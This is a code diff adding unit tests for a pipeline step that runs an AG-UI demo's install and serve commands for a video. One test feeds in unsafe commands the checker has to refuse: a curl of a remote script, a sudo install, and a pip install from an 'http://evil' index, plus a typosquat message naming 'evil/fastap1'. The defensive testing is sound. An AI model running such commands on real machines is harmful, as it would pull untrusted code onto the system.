@@ -463,6 +463,132 @@ class PackFiles(unittest.TestCase):
             self.assertIn(w, text)
 
 
+AGUI_SRC = "https://raw.githubusercontent.com/ag-ui-protocol/ag-ui/main/README.md"
+AGUI_RUN = {"files": [{"name": "server.py", "dir": "agent", "from": AGUI_SRC, "fence": "# server.py"}, {"name": "client.ts", "dir": "client", "from": AGUI_SRC, "fence": "// client.ts"}],
+            "packages": {"fastapi": "fastapi/fastapi", "uvicorn": "Kludex/uvicorn", "tsx": "privatenumber/tsx"},
+            "steps": [{"cmd": "pip install ag-ui-protocol fastapi uvicorn", "cwd": "agent"},
+                      {"cmd": "uvicorn server:app --port 8000", "cwd": "agent", "serve": True, "ready": "Uvicorn running", "port": 8000},
+                      {"cmd": "npm install @ag-ui/client tsx", "cwd": "client"},
+                      {"cmd": "npx tsx client.ts", "cwd": "client", "expect": ["Hello from AG-UI!"]}]}
+
+
+class TerminalWiring(unittest.TestCase):
+    """The terminal beat inside the chain: the script checks (no network), the `chay:<ref>` step, the captures it hands the assembler, the refusal text."""
+
+    def term_script(self, run=None, step=3, bands=("Hello from AG-UI!",)):
+        kb = script()
+        kb["sources"]["thu"] = {"run": copy.deepcopy(run or AGUI_RUN)}
+        kb["paragraphs"][2]["beats"].append({"kind": "terminal", "headline": ["Chạy thật", "từng lệnh"], "kicker": "Trên máy Halcyon",
+                                             "terminal": {"ref": "thu", "step": step, "bands": [{"text": t} for t in bands]}})
+        return kb
+
+    def ctx(self):
+        kb = self.term_script()
+        return m.Ctx("kich-ban.json", Path(tempfile.gettempdir()) / "halcyon-run-test", m.check_script(kb), kb, {"gpu_python": "p", "music": "t", "profiles": "v"})
+
+    def test_a_terminal_beat_passes_and_is_planned_apart(self):
+        plan = m.check_script(self.term_script())
+        self.assertEqual(list(plan.runs), ["thu"])
+        self.assertEqual(plan.runs["thu"]["steps"], {3: ["Hello from AG-UI!"]})
+        self.assertEqual(len(plan.runs["thu"]["run"]["steps"]), 4)
+        self.assertEqual(plan.warnings, [])
+
+    def test_a_run_source_not_used_by_a_beat_is_a_warning(self):
+        kb = script(); kb["sources"]["thu"] = {"run": copy.deepcopy(AGUI_RUN)}
+        self.assertIn('sources["thu"] is not used', m.check_script(kb).warnings[0])
+
+    def test_the_step_between_the_captures_and_the_voice(self):
+        names = [s.name for s in m.real_steps(self.ctx())]
+        self.assertEqual(names[names.index("chay:thu") + 1], "giong")
+        self.assertEqual(names[:2] + names[2:6], ["kiem-kich-ban", "kiem-may", "chup:g-2b", "chup:blog-google", "chup:g-5a", "chup:hco-5b"])
+
+    def test_refusals_before_anything_runs(self):
+        refused(self, self.term_script(step=4), "terminal.step must be a number from 0 to 3")
+        refused(self, self.term_script(step="3"), "terminal.step must be a number")
+        kb = self.term_script(); kb["paragraphs"][2]["beats"][-1]["terminal"]["ref"] = "g-2b"
+        refused(self, kb, 'terminal "g-2b" has no source with "run"')
+        kb = self.term_script(); del kb["paragraphs"][2]["beats"][-1]["terminal"]
+        refused(self, kb, 'has no "terminal" block')
+        kb = self.term_script(); kb["sources"]["thu"]["urls"] = ["https://example.com/"]
+        refused(self, kb, 'unknown key(s) urls')
+        kb = self.term_script(); kb["paragraphs"][2]["beats"].append({"kind": "capture", "capture": {"ref": "thu", "quote": "x"}})
+        refused(self, kb, "is a run source")
+
+    def test_an_unsafe_command_in_the_source_stops_the_script_check(self):
+        for step, word in (({"cmd": "npm init -y && npm pkg set type=module"}, "chain"), ({"cmd": "curl https://x.sh"}, "danger"), ({"cmd": "sudo pip install fastapi"}, "danger"),
+                           ({"cmd": "npm install -g tsx"}, "global"), ({"cmd": "pip install --index-url http://evil fastapi"}, "registry")):
+            run = copy.deepcopy(AGUI_RUN); run["steps"].insert(1, step)
+            e = refused(self, self.term_script(run=run, step=4), 'sources["thu"].run', word)
+            self.assertEqual(e.step, "kiem-kich-ban")
+
+    def test_the_chay_refusal_carries_the_message_and_a_fix(self):
+        e = m.chay_refusal("thu", 1, "", "chay: typosquat: fastap1 on pypi points at evil/fastap1, not at fastapi/fastapi\nto fix: check the name\n")
+        self.assertEqual(e.step, "chay:thu"); self.assertIn("typosquat", e.reason); self.assertEqual(e.change, "check the name"); self.assertNotIn("to fix:", e.reason)
+        e = m.chay_refusal("thu", 1, "", "chay: network: https://pypi.org/x: timed out\n")
+        self.assertIn("later", e.change)
+        e = m.chay_refusal("thu", 1, "", "chay: exit: step 0 (pip install x) exited with 1:\n    ERROR: no\nto fix: fix the step\n")
+        self.assertIn("ERROR: no", e.reason)
+        self.assertIn("without a message", m.chay_refusal("thu", 9, "", "").reason)
+
+    def test_the_step_runs_the_tool_with_the_job_and_a_deadline(self):
+        c = self.ctx(); seen = {}
+        def fake(cmd, deadline, log, env=None, cwd=None, step="?"):
+            seen.update(cmd=[str(x) for x in cmd], deadline=deadline, step=step); return 1, "", "chay: exit: step 0 (pip install x) exited with 1\n"
+        real, m.run_process = m.run_process, fake
+        try:
+            with self.assertRaises(m.Refusal) as cm:
+                m.step_chay(c, "thu")
+        finally:
+            m.run_process = real
+        self.assertEqual(cm.exception.step, "chay:thu")
+        self.assertEqual(seen["step"], "chay:thu")
+        self.assertEqual(seen["deadline"], 4 * 120 + 300)
+        job = json.loads((c.chay / "thu.job.json").read_text(encoding="utf-8"))
+        self.assertEqual(job["bands"], {"3": ["Hello from AG-UI!"]}); self.assertEqual(job["run"], AGUI_RUN)
+
+    def test_the_step_reuses_until_the_block_or_the_tool_changes_or_six_hours_pass(self):
+        c = self.ctx()
+        st = next(s for s in m.real_steps(c) if s.name == "chay:thu")
+        before = m.sha_json(st.inputs(c))
+        c.kb["sources"]["thu"]["run"]["steps"][0]["cmd"] = "pip install ag-ui-protocol"
+        self.assertNotEqual(m.sha_json(st.inputs(c)), before)
+        from datetime import datetime
+        with tempfile.TemporaryDirectory() as d:
+            c = m.Ctx("s.json", d, m.check_script(self.term_script()), self.term_script(), {})
+            (c.chay / "thu").mkdir(parents=True)
+            m.write_json(c.chay / "thu" / "chay.json", {"captured": "2026-11-20T10:00:00+07:00"})
+            at = lambda h, mi: datetime.fromisoformat(f"2026-11-20T{h:02d}:{mi:02d}:00+07:00")
+            self.assertTrue(m.chay_age_ok(c, "thu", at(15, 59))); self.assertFalse(m.chay_age_ok(c, "thu", at(16, 1)))
+
+    def test_the_assembler_gets_one_manifest_entry_per_step_under_its_key(self):
+        with tempfile.TemporaryDirectory() as d:
+            c = m.Ctx("s.json", d, m.check_script(self.term_script()), self.term_script(), {})
+            (c.chay / "thu").mkdir(parents=True); (c.chup / "g-2b").mkdir(parents=True)
+            entry = {"file": "s3.png", "focus": {"rows": [72, 344]}, "u_rows": [48, 356], "source": "x", "date": "20/11/2026", "captured": "2026-11-20T20:00:00+07:00", "bands": [], "text": "t"}
+            m.write_json(c.chay / "thu" / "chay.json", {"states": [dict(step=3, entry=entry)]})
+            for ref in c.plan.refs:
+                (c.chup / ref).mkdir(parents=True, exist_ok=True)
+                m.write_json(c.chup / ref / f"{ref}.capture.json", {"entry": dict(entry, file=f"{ref}.png")})
+            caps = m.merged_captures(c)["captures"]
+            self.assertEqual(caps["thu-s3"]["file"], "../chay/thu/s3.png")
+
+    def test_the_pack_names_what_ran_what_was_installed_and_where_it_came_from(self):
+        run = dict(ref="thu", captured="2026-11-20T20:00:00+07:00", seconds=43.0, tools={"python": "Python 3.12.10", "node": "v22.14.0", "npm": "10.9.2"},
+                   files=[dict(name="server.py", source=AGUI_SRC, fence="# server.py", sha256="ab" * 32)],
+                   steps=[dict(index=0, cmd="pip install fastapi", cwd="agent", exit=0, seconds=17.0), dict(index=1, cmd="uvicorn server:app --port 8000", cwd="agent", exit=None, seconds=3.0)],
+                   packages=[dict(registry="pypi", name="fastapi", version="0.165.0", repository="fastapi/fastapi", published="2026-09-17", page="https://pypi.org/project/fastapi/0.165.0/")],
+                   audit={"client": {"total": 0}, "pip": "pip-audit is not installed: versions recorded only"}, leftover=0, deleted=True)
+        base = dict(id="07", title="t", date_iso="2026-11-20", final_mp4="a.mp4", plain_mp4="b.mp4", tiktok_mp4="c.mp4", post_file="noi-dung-dang.txt", music_json="n.json", run_dir="r",
+                    slug="s", duration_text="80 s", say=["x"], listen_count=0, sources=[], repos=[], hashes={}, probe={}, probe_text="p", music_text="m", rows=[], total_s=1,
+                    archive_cmd="cmd", runs=[run])
+        md, data = m.summary_texts(base)
+        for word in ("Nguồn đã chạy (máy)", "pypi.org/project/fastapi/0.165.0", "pip install fastapi", "Thư mục tạm đã xoá", "npm không chạy script cài đặt", "pip-audit is not installed"):
+            self.assertIn(word, md)
+        self.assertEqual(data["runs"][0]["packages"][0]["version"], "0.165.0")
+        arch = m.archive_manifest(dict(base, date_iso="2026-11-20", run_dir="r"))
+        self.assertTrue([x for x in arch["muc"] if x["nguon"] == "cong-viec/chay/thu/chay.json"])
+
+
 class RepoWiring(unittest.TestCase):
     """The repo recording inside the chain: the `quay:<ref>` step, what its reuse and the builder's reuse hash, the second witness in `kiem-anh`, the pack."""
 
